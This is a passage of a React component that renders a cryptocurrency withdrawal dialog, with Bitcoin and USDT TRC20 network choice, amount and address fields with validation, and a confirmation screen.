              <button onClick={() => { setShowWithdrawModal(false); setWithdrawDone(false); setWithdrawAmount(''); setWithdrawAddress(''); setAddressError('') }}
                style={{ background: 'transparent', border: 'none', color: G.muted, cursor: 'pointer', fontSize: 20 }}>✕</button>
            </div>
            {!withdrawDone ? (
              <>
                <div style={{ fontSize: 13, color: G.muted }}>Available balance: <span style={{ color: G.gold, fontWeight: 800, fontSize: 15 }}>${balance.toFixed(2)}</span></div>

                {/* Network selector */}
                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Withdrawal Network</div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                    {(['BTC', 'USDT'] as const).map(n => (
                      <button key={n} onClick={() => { setWithdrawNetwork(n); setWithdrawAddress(''); setAddressError('') }}
                        style={{ padding: '12px', borderRadius: 8, border: `1px solid ${withdrawNetwork === n ? G.goldBorder : G.border}`, background: withdrawNetwork === n ? G.goldDim : 'transparent', color: withdrawNetwork === n ? G.gold : G.muted, fontWeight: 700, cursor: 'pointer', fontSize: 13 }}>
                        {n === 'USDT' ? '₮ USDT TRC20' : '₿ Bitcoin'}
                      </button>
                    ))}
                  </div>
                  <div style={{ fontSize: 11, color: G.sec, marginTop: 6 }}>
                    {withdrawNetwork === 'USDT' ? '⚠ Only TRC20 (Tron) network supported' : '⚠ Bitcoin mainnet only'}
                  </div>
                </div>

                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>Amount (USD)</div>
                  <input type="number" placeholder="Min. $10" value={withdrawAmount} onChange={e => setWithdrawAmount(e.target.value)}
                    style={{ width: '100%', background: G.bg3, border: `1px solid ${G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 13, color: G.text, outline: 'none', boxSizing: 'border-box' }} />
                </div>

                <div>
                  <div style={{ fontSize: 11, color: G.muted, marginBottom: 8 }}>
                    Your {withdrawNetwork === 'USDT' ? 'USDT TRC20' : 'Bitcoin'} Address
                  </div>
                  <input type="text"
                    placeholder={withdrawNetwork === 'USDT' ? 'T... (TRC20 address)' : '1... or bc1... (BTC address)'}
                    value={withdrawAddress}
                    onChange={e => { setWithdrawAddress(e.target.value); setAddressError('') }}
                    style={{ width: '100%', background: G.bg3, border: `1px solid ${addressError ? G.red : G.border}`, borderRadius: 8, padding: '12px 16px', fontSize: 12, color: G.text, outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }} />
                  {addressError && <div style={{ fontSize: 11, color: G.redText, marginTop: 6 }}>⚠ {addressError}</div>}
                  {withdrawAddress && !addressError && validateAddress(withdrawAddress, withdrawNetwork) && (
                    <div style={{ fontSize: 11, color: G.greenText, marginTop: 6 }}>✓ Valid {withdrawNetwork} address</div>
                  )}
                </div>

                <button onClick={handleWithdraw} disabled={withdrawLoading}
                  style={{ background: G.gold, color: '#000', fontWeight: 800, fontSize: 14, padding: 14, borderRadius: 10, border: 'none', cursor: 'pointer', opacity: withdrawLoading ? 0.6 : 1 }}>
                  {withdrawLoading ? 'Submitting...' : 'Request Withdrawal →'}
                </button>
                <div style={{ fontSize: 11, color: G.muted, textAlign: 'center' }}>Processed within 24 hours · Minimum $10</div>
              </>
            ) : (
              <div style={{ textAlign: 'center', padding: 20 }}>
                <div style={{ fontSize: 40, marginBottom: 12 }}>✅</div>
                <div style={{ fontSize: 18, fontWeight: 800, marginBottom: 8 }}>Withdrawal Requested</div>
                <div style={{ fontSize: 13, color: G.muted, marginBottom: 20 }}>Your withdrawal will be processed within 24 hours to your {withdrawNetwork} address.</div>
                <button onClick={() => { setShowWithdrawModal(false); setWithdrawDone(false); setWithdrawAmount(''); setWithdrawAddress('') }}
                  style={{ background: G.goldDim, color: G.gold, border: `1px solid ${G.goldBorder}`, fontWeight: 700, fontSize: 13, padding: '10px 24px', borderRadius: 8, cursor: 'pointer' }}>
                  Done
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}